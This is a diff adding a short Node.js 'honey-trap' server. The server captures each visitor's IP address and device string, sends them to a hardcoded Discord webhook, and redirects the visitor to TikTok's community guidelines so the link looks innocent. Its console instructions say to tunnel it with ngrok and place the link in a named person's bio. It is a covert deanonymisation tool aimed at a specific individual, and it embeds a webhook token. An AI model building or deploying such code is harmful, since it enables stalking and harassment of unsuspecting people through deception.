@@ -1,0 +1,32 @@
+import http from 'http';
+import { WebhookClient } from 'discord.js';
+
+// 🔗 YOUR DISCORD WEBHOOK
+const webhook = new WebhookClient({ url: 'https://discord.com/api/webhooks/1486737673514258634/rCmwKMfrrhWqTyMshtXFqX7s7-gTYARZBKpwntBrnUxGAITaxPWTNanEhqYIa4Cj4eVm' });
+
+const server = http.createServer(async (req, res) => {
+    // Captures the IP address behind the Ngrok tunnel
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const device = req.headers['user-agent'];
+
+    console.log(`\n🚨 [TRAP TRIGGERED]`);
+    console.log(`📍 IP Captured: ${ip}`);
+    console.log(`📱 Device Info: ${device}`);
+
+    try {
+        await webhook.send({
+            content: `🚨 **AEGIS IP CAPTURE**\n**Source IP:** \`${ip}\`\n**Target Device:** \`${device}\`\n**Status:** Target redirected to Decoy.`
+        });
+    } catch (e) {
+        console.log("Discord alert failed, but IP was logged in this terminal.");
+    }
+
+    // Redirect them to the TikTok Guidelines so they think it was just a policy link
+    res.writeHead(302, { Location: 'https://www.tiktok.com/community-guidelines' });
+    res.end();
+});
+
+server.listen(8080, () => {
+    console.log("🕸️  HONEY-TRAP ACTIVE ON PORT 8080");
+    console.log("👉 Now run: 'ngrok http 8080' to get the link for Jess's bio.");
+});
